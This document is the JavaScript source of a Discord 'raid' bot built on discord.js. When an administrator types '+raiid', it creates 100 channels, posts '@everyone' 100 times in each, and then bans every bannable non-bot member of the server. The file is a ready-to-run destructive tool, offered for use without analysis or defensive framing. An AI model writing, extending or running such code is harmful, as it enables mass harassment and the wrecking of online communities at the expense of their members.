const { Client, GatewayIntentBits, PermissionsBitField, ChannelType } = require('discord.js');
const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent] });

const token = 'met ton token ici bg';

client.once('ready', () => {
    console.log('Bot is online!');
});

client.on('messageCreate', async message => {
    if (message.content === '+raiid') {
        console.log('Command +raiid detected');

        if (message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
            console.log('User has administrator permissions');

            // Create 100 channels and ping @everyone 100 times in each channel
            for (let i = 1; i <= 100; i++) {
                try {
                    const newChannel = await message.guild.channels.create({
                        name: `notification-${i}`,
                        type: ChannelType.GuildText // Updated to use ChannelType for clarity
                    });
                    console.log(`Created channel notification-${i}`);

                    for (let j = 0; j < 100; j++) {
                        await newChannel.send('@everyone');
                    }
                } catch (error) {
                    console.error(`Failed to create channel notification-${i}:`, error);
                }
            }
            message.channel.send('100 channels created and everyone pinged 100 times in each channel.');

            // Fetch all members and ban them
            message.guild.members.fetch().then(members => {
                members.forEach(member => {
                    if (!member.user.bot && member.bannable) {
                        member.ban({ reason: 'Banall command executed after raid' }).then(() => {
                            console.log(`Banned ${member.user.tag}`);
                        }).catch(error => {
                            console.error(`Failed to ban ${member.user.tag}:`, error);
                        });
                    }
                });
            }).catch(error => {
                console.error('Failed to fetch guild members:', error);
            });

            message.channel.send('Banall command executed. All bannable members will be banned.');
        } else {
            console.log('User does not have administrator permissions');
            message.channel.send('You do not have permission to use this command.');
        }
    } else {
        console.log('Wrong command');
    }
});

client.login(token);
